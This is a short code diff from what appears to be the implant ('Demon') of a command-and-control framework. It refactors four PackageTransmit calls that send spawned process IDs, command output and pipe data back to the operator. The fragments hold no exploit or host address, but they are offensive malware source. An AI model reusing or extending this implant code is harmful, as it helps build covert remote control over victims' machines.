@@ -655,7 +655,7 @@ BOOL ProcessCreate(
         {
             PackageAddWString( Package, App );
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
-            PackageTransmit( Package, NULL, NULL );
+            PackageTransmit( Package );
         }
         else
         {
@@ -675,7 +675,7 @@ BOOL ProcessCreate(
 
             PackageAddWString( Package, s );
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
-            PackageTransmit( Package, NULL, NULL );
+            PackageTransmit( Package );
 
             PUTS( "Cleanup" )
             MemSet( s, 0, x );
@@ -931,7 +931,7 @@ VOID AnonPipesRead(
     if ( dwBufferSize ) {
         Package = PackageCreateWithRequestID( RequestID, DEMON_OUTPUT );
         PackageAddBytes( Package, Buffer, dwBufferSize );
-        PackageTransmit( Package, NULL, NULL );
+        PackageTransmit( Package );
     }
 
     DATA_FREE( Buffer, dwBufferSize );
@@ -1281,7 +1281,7 @@ VOID DemonPrintf( PCHAR fmt, ... )
 
     PackageAddInt32( package, 0 ); // CALLBACK_OUTPUT
     PackageAddBytes( package, CallbackOutput, CallbackSize );
-    PackageTransmit( package, NULL, NULL );
+    PackageTransmit( package );
 
     MemSet( CallbackOutput, 0, CallbackSize );
     Instance.Win32.LocalFree( CallbackOutput );
